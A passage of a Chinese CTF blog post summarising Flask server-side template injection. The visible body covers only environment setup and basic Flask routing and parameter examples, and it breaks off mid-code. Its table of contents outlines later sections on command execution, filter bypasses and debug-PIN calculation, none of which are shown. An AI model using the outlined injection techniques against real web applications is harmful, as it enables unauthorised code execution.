<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.boychai.xyz","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/google-dark","dark":"base16/google-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="环境创建 1 2 3   conda create -n flask python&#x3D;3.11 conda activate flask pip install flask   关于flask Flask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。  简单案例 下面简单的创建一个flask">
<meta property="og:type" content="article">
<meta property="og:title" content="WEB-Flask模板注入总结">
<meta property="og:url" content="https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="BoyChai&#39;s Blog">
<meta property="og:description" content="环境创建 1 2 3   conda create -n flask python&#x3D;3.11 conda activate flask pip install flask   关于flask Flask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。  简单案例 下面简单的创建一个flask">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250627180217.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250627185529.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250627195103.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628160325.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628160453.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628160741.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628160943.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628162054.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628165651.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628170243.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628183423.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250628184905.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250630210758.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250630213236.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250701161118.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250701162420.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702133606.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702173957.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702181729.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702181815.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702174343.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702180555.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702182532.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702182546.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702182745.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702194840.png">
<meta property="og:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250702201232.png">
<meta property="article:published_time" content="2025-07-02T20:17:00.000Z">
<meta property="article:modified_time" content="2025-07-17T05:40:18.601Z">
<meta property="article:author" content="BoyChai">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="WEB">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="Flask">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://image.boychai.xyz/article/Pasted%20image%2020250627180217.png">


<link rel="canonical" href="https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","path":"2025/07/02/WEB-Flask模板注入总结/","title":"WEB-Flask模板注入总结"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>WEB-Flask模板注入总结 | BoyChai's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="dns-prefetch" href="waline-server-ten-phi.vercel.app">
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="BoyChai's Blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="headband">
  <a target="_blank" rel="noopener" href="https://github.com/boychai" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
  </div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">BoyChai's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-开往"><a href="https://www.travellings.cn/go.html" rel="section" target="_blank"><i class="fa fa-car fa-fw"></i>开往</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%88%9B%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境创建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eflask"><span class="nav-number">2.</span> <span class="nav-text">关于flask</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%A1%88%E4%BE%8B"><span class="nav-number">2.1.</span> <span class="nav-text">简单案例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">参数传入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.3.</span> <span class="nav-text">关于模板</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">简单利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-number">5.</span> <span class="nav-text">常用模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">5.1.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.2.</span> <span class="nav-text">eval命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#os%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.3.</span> <span class="nav-text">os命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#importlib%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.4.</span> <span class="nav-text">importlib命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linecache%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.5.</span> <span class="nav-text">linecache命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#subprocess%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.6.</span> <span class="nav-text">subprocess命令执行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8C%E6%8B%AC%E5%BC%A7%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">双括弧绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">无回显绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">中括号过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">9.</span> <span class="nav-text">单双引号过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">10.</span> <span class="nav-text">下划线过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">11.</span> <span class="nav-text">字符串过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%82%B9%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">12.</span> <span class="nav-text">点过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">13.</span> <span class="nav-text">数字过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#config%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">14.</span> <span class="nav-text">config过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">15.</span> <span class="nav-text">综合符号过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E7%AC%A6%E5%8F%B7%E5%8A%A0%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">16.</span> <span class="nav-text">综合符号加数字过滤绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%9B%B8%E5%85%B3%E8%84%9A%E6%9C%AC%E4%B8%8E%E9%80%9A%E7%94%A8%E8%BD%BD%E8%8D%B7"><span class="nav-number">17.</span> <span class="nav-text">爆破相关脚本与通用载荷</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EFLASK%E7%9A%84Pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-number">18.</span> <span class="nav-text">关于FLASK的Pin码计算</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E8%A7%A3%E8%AF%BB"><span class="nav-number">18.1.</span> <span class="nav-text">关于源代码的解读</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pin%E7%A0%81%E8%AE%A1%E7%AE%97%E8%84%9A%E6%9C%AC"><span class="nav-number">18.2.</span> <span class="nav-text">Pin码计算脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98FlaskApp"><span class="nav-number">18.3.</span> <span class="nav-text">例题FlaskApp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%9A%E6%9D%80%E5%B7%A5%E5%85%B7-%E7%84%9A%E9%9D%96"><span class="nav-number">19.</span> <span class="nav-text">通杀工具-焚靖</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">19.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">19.2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">19.3.</span> <span class="nav-text">使用</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="BoyChai"
      src="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
  <p class="site-author-name" itemprop="name">BoyChai</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">75</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/BoyChai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BoyChai" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:admin@boychai.xyz" title="E-Mail → mailto:admin@boychai.xyz" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://space.bilibili.com/277637284" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;277637284" rel="noopener me" target="_blank"><i class="fab fa-bilibili fa-fw"></i>Bilibili</a>
      </span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/88495409?s=96&v=4">
      <meta itemprop="name" content="BoyChai">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BoyChai's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="WEB-Flask模板注入总结 | BoyChai's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WEB-Flask模板注入总结
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-07-02 20:17:00" itemprop="dateCreated datePublished" datetime="2025-07-02T20:17:00+00:00">2025-07-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/" itemprop="url" rel="index"><span itemprop="name">CTF相关</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF%E7%9B%B8%E5%85%B3/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="far fa-comment"></i>
    </span>
    <span class="post-meta-item-text">Waline：</span>
  
    <a title="waline" href="/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/#waline" itemprop="discussionUrl">
      <span class="post-comments-count waline-comment-count" data-path="/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>9.9k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>36 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="环境创建"><a href="#环境创建" class="headerlink" title="环境创建"></a>环境创建</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n flask python=<span class="number">3</span>.<span class="number">11</span></span><br><span class="line">conda activate flask</span><br><span class="line">pip install flask</span><br></pre></td></tr></table></figure>

<h1 id="关于flask"><a href="#关于flask" class="headerlink" title="关于flask"></a>关于flask</h1><p>Flask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。</p>
<h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>下面简单的创建一个flask应用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>此时用flask的环境去运行，会自动监在本地的<code>5000</code>端口，去访问会回显<code>Hello，World</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627180217.png"></p>
<h2 id="参数传入"><a href="#参数传入" class="headerlink" title="参数传入"></a>参数传入</h2><p>传参的方法有很多种，这里简单列举几个比较常用的，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 字符串</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello/&lt;name&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 int</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/int/&lt;int:id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_id</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;int, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 float</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/float/&lt;float:id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">float_id</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;float, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># form传参</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post_get&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_get_id</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;GET, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line">    <span class="built_in">id</span> = request.form[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;POST, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 